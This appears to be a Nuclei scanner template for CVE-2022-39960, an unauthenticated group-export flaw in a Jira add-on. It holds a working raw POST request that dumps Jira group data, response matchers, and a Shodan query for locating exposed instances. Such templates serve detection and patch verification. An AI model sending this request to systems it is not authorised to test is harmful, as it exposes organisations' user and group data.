id: CVE-2022-39960

info:
  name: Atlassian Jira Unauth Access
  author: For3stCo1d
  severity: high
  description: |
    The Netic Group Export add-on before 1.0.3 for Atlassian Jira does not perform authorization checks. This might allow an unauthenticated user to export all groups from the Jira instance by making a groupexport_download=true request to a plugins/servlet/groupexportforjira/admin/ URI.
  reference:
    - https://gist.github.com/CveCt0r/ca8c6e46f536e9ae69fc6061f132463e
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39960
    - https://marketplace.atlassian.com/apps/1222388/group-export-for-jira/version-history
  metadata:
    verified: true
    shodan-query: http.component:"Atlassian Jira"
  tags: cve,cve2022,atlassian,jira,unauth

requests:
  - raw:
      - |
        POST /plugins/servlet/groupexportforjira/admin/json HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        groupexport_searchstring=&groupexport_download=true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"jiraGroupObjects"'
          - '"groupName"'
          - '"jiraGroupApplicationRoleObjects"'
        condition: and

      - type: word
        part: header
        words:
          - atlassian.xsrf.token=

      - type: status
        status:
          - 200
